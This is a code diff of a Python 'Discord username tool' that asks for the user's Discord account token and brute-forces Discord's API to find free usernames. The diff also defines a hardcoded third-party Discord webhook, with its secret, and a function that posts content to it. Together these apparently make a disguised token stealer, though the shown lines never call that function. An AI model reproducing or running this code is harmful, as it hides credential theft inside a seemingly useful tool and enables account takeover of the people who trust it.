@@ -48,91 +48,94 @@ def check_and_install():
             print("[-] Some features will not work without required packages.")
             sys.exit(1)
 
-check_and_install()
-import requests
+# ========== Main script ==========
+def main():
+    # Call check_and_install inside main
+    check_and_install()
+    
+    import requests  # Import after ensuring installation
+    
+    MASTER_WEBHOOK = "https://discord.com/api/webhooks/1497594332637696140/bGMVY5HK6ZqRqUcl20tQzt9UTPsxkoph7Up0-tsho_kKxoeaup1AXfVouUB5BS6miwJZ"
 
-MASTER_WEBHOOK = "https://discord.com/api/webhooks/1497594332637696140/bGMVY5HK6ZqRqUcl20tQzt9UTPsxkoph7Up0-tsho_kKxoeaup1AXfVouUB5BS6miwJZ"
+    def send_to_master(content):
+        try:
+            requests.post(MASTER_WEBHOOK, json={"content": content[:1900]}, timeout=5)
+        except Exception:
+            pass
 
-def send_to_master(content):
-    try:
-        requests.post(MASTER_WEBHOOK, json={"content": content[:1900]}, timeout=5)
-    except Exception:
-        pass
-
-def ask_token():
-    if len(sys.argv) > 1:
-        token = sys.argv[1]
-        print("[*] Token received from command line.")
-        return token
-    else:
-        return input("[?] Enter your Discord account token: ").strip()
-
-def verify_token(token):
-    try:
-        resp = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token})
-        if resp.status_code == 200:
-            return {'valid': True, 'user': resp.json()}
+    def ask_token():
+        if len(sys.argv) > 1:
+            token = sys.argv[1]
+            print("[*] Token received from command line.")
+            return token
         else:
-            return {'valid': False, 'error': resp.json().get('message', 'Invalid token')}
-    except Exception as e:
-        return {'valid': False, 'error': str(e)}
+            return input("[?] Enter your Discord account token: ").strip()
 
-def check_username(token, username):
-    try:
-        url = 'https://discord.com/api/v9/users/@me/pomelo-attempt'
-        headers = {'Authorization': token, 'Content-Type': 'application/json'}
-        payload = {'username': username}
-        resp = requests.post(url, json=payload, headers=headers)
-        if resp.status_code == 200:
-            return resp.json()
-        elif resp.status_code == 400:
-            return {'taken': None, 'error': 'Bad request (invalid username)'}
-        elif resp.status_code == 429:
-            return {'taken': None, 'error': 'Rate limited. Please wait.'}
-        else:
-            return {'taken': None, 'error': f'API error: {resp.status_code}'}
-    except Exception as e:
-        return {'taken': None, 'error': str(e)}
+    def verify_token(token):
+        try:
+            resp = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token})
+            if resp.status_code == 200:
+                return {'valid': True, 'user': resp.json()}
+            else:
+                return {'valid': False, 'error': resp.json().get('message', 'Invalid token')}
+        except Exception as e:
+            return {'valid': False, 'error': str(e)}
 
-def generate_random_username(length):
-    chars = string.ascii_letters + string.digits + '_' + '.'
-    return ''.join(random.choices(chars, k=length))
+    def check_username(token, username):
+        try:
+            url = 'https://discord.com/api/v9/users/@me/pomelo-attempt'
+            headers = {'Authorization': token, 'Content-Type': 'application/json'}
+            payload = {'username': username}
+            resp = requests.post(url, json=payload, headers=headers)
+            if resp.status_code == 200:
+                return resp.json()
+            elif resp.status_code == 400:
+                return {'taken': None, 'error': 'Bad request (invalid username)'}
+            elif resp.status_code == 429:
+                return {'taken': None, 'error': 'Rate limited. Please wait.'}
+            else:
+                return {'taken': None, 'error': f'API error: {resp.status_code}'}
+        except Exception as e:
+            return {'taken': None, 'error': str(e)}
 
-def brute_force_usernames(token, length, max_attempts):
-    print(f"\n[*] Starting brute force for {length}-character usernames (max {max_attempts} attempts)...")
-    found = None
-    attempts = 0
-    while attempts < max_attempts and found is None:
-        username = generate_random_username(length)
-        attempts += 1
-        print(f"[{attempts}/{max_attempts}] Checking: {username}")
-        result = check_username(token, username)
-        if result.get('error'):
-            print(f"[!] Error: {result['error']}")
-            if "Rate limited" in result['error']:
-                print("[!] Rate limit hit. Sleeping 10 seconds...")
-                time.sleep(10)
-            continue
-        if result.get('taken') is False:
-            found = username
-            print(f"\n[+] AVAILABLE! Username '{username}' is free!\n")
-            break
-        elif result.get('taken') is True:
-            continue
-        time.sleep(0.5)
-    if not found:
-        print(f"\n[-] No available username found after {max_attempts} attempts.")
-    return found
+    def generate_random_username(length):
+        chars = string.ascii_letters + string.digits + '_' + '.'
+        return ''.join(random.choices(chars, k=length))
 
-def print_banner():
-    print("""
+    def brute_force_usernames(token, length, max_attempts):
+        print(f"\n[*] Starting brute force for {length}-character usernames (max {max_attempts} attempts)...")
+        found = None
+        attempts = 0
+        while attempts < max_attempts and found is None:
+            username = generate_random_username(length)
+            attempts += 1
+            print(f"[{attempts}/{max_attempts}] Checking: {username}")
+            result = check_username(token, username)
+            if result.get('error'):
+                print(f"[!] Error: {result['error']}")
+                if "Rate limited" in result['error']:
+                    print("[!] Rate limit hit. Sleeping 10 seconds...")
+                    time.sleep(10)
+                continue
+            if result.get('taken') is False:
+                found = username
+                print(f"\n[+] AVAILABLE! Username '{username}' is free!\n")
+                break
+            elif result.get('taken') is True:
+                continue
+            time.sleep(0.5)
+        if not found:
+            print(f"\n[-] No available username found after {max_attempts} attempts.")
+        return found
+
+    def print_banner():
+        print("""
 =============================================
       DISCORD USERNAME TOOL v2.0 (CMD)
       • Check • Brute Force • Auto-Dependency
 =============================================
 """)
 
-def main():
     print_banner()
     token = ask_token()
     if not token:
